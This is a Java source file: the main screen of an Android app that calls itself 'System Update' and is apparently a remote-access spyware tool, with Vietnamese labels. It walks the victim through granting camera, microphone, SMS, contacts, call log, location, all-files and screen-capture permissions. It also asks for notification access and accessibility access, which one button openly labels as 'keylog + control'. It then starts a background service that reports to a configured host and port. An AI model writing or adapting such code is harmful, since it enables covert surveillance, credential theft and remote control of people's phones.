package com.zeko.droid;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;

public class MainActivity extends Activity {

    private static final int REQ_PERMS = 100;
    private static final int REQ_PROJ = 101;
    private MediaProjectionManager pm;
    private TextView status;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        Cfg.load(this);
        pm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        ScrollView scroll = new ScrollView(this);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(48, 64, 48, 48);
        root.setBackgroundColor(Color.parseColor("#050a14"));

        TextView title = new TextView(this);
        title.setText("🐋  System Update");
        title.setTextSize(22);
        title.setTextColor(Color.parseColor("#22d3ee"));
        root.addView(title);

        TextView sub = new TextView(this);
        sub.setText("Cài đặt lần đầu — cần cấp đủ quyền để chạy nền.");
        sub.setTextColor(Color.parseColor("#6e8bb0"));
        sub.setPadding(0, 12, 0, 28);
        root.addView(sub);

        root.addView(btn("1. Cấp quyền", v -> requestAll()));
        root.addView(btn("2. Bật chia sẻ màn hình", v -> askProjection()));
        root.addView(btn("3. Mở cài đặt pin (không tối ưu)", v -> openBattery()));
        root.addView(btn("3b. Bật trợ năng (keylog + điều khiển)", v -> openAccessibility()));
        root.addView(btn("3c. Cho phép đọc thông báo", v -> openNotifAccess()));
        root.addView(btn("4. Khởi động dịch vụ", v -> startServiceNow()));

        status = new TextView(this);
        status.setTextColor(Color.parseColor("#22e08a"));
        status.setPadding(0, 32, 0, 0);
        root.addView(status);

        scroll.addView(root, new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT));
        setContentView(scroll);

        requestAll();
    }

    private Button btn(String text, android.view.View.OnClickListener l) {
        Button b = new Button(this);
        b.setText(text);
        b.setAllCaps(false);
        b.setOnClickListener(l);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 0, 0, 18);
        b.setLayoutParams(lp);
        return b;
    }

    private void requestAll() {
        ArrayList<String> need = new ArrayList<>();
        String[] wanted = {
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.POST_NOTIFICATIONS
        };
        for (String p : wanted) {
            if (Build.VERSION.SDK_INT >= 23 && checkSelfPermission(p) != 0) need.add(p);
        }
        if (Build.VERSION.SDK_INT >= 30) {
            // quyền file rộng (MANAGE_EXTERNAL_STORAGE) mở bằng màn hình riêng
            if (!android.os.Environment.isExternalStorageManager()) {
                try {
                    Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                            Uri.parse("package:" + getPackageName()));
                    startActivity(i);
                } catch (Throwable ignored) { }
            }
        } else if (Build.VERSION.SDK_INT >= 23) {
            if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != 0)
                need.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
            if (checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) != 0)
                need.add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }

        if (!need.isEmpty() && Build.VERSION.SDK_INT >= 23) {
            requestPermissions(need.toArray(new String[0]), REQ_PERMS);
        } else {
            startServiceNow();
        }
    }

    @Override public void onRequestPermissionsResult(int code, String[] perms, int[] res) {
        super.onRequestPermissionsResult(code, perms, res);
        int ok = 0;
        for (int r : res) if (r == 0) ok++;
        toast("Đã cấp " + ok + "/" + res.length + " quyền");
        startServiceNow();
    }

    private void askProjection() {
        if (pm == null) { toast("máy không hỗ trợ MediaProjection"); return; }
        try {
            startActivityForResult(pm.createScreenCaptureIntent(), REQ_PROJ);
        } catch (Throwable t) {
            toast("lỗi: " + t.getMessage());
        }
    }

    @Override protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == REQ_PROJ && res == RESULT_OK && data != null) {
            try {
                Media.projection = pm.getMediaProjection(res, data);
                Media.startScreen(this);
                toast("Đã bật chia sẻ màn hình");
                if (status != null) status.setText("MediaProjection: OK");
            } catch (Throwable t) {
                toast("lỗi projection: " + t.getMessage());
            }
        }
    }

    private void openBattery() {
        try {
            Intent i = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
            startActivity(i);
        } catch (Throwable t) { toast("không mở được"); }
    }

    private void openAccessibility() {
        try {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            toast("Bật 'System Update' trong danh sách trợ năng");
        } catch (Throwable t) { toast("không mở được"); }
    }

    private void openNotifAccess() {
        try {
            startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
            toast("Bật 'System Update' trong Notification access");
        } catch (Throwable t) {
            try { startActivity(new Intent(Settings.ACTION_SETTINGS)); } catch (Throwable ignored) { }
        }
    }

    private void startServiceNow() {
        try {
            Intent i = new Intent(this, Core.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
            else startService(i);
            if (status != null) status.setText("Dịch vụ: ĐANG CHẠY → " + Cfg.host() + ":" + Cfg.port());
        } catch (Throwable t) {
            toast("lỗi start service: " + t.getMessage());
        }
    }

    private void toast(String s) {
        Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
    }
}
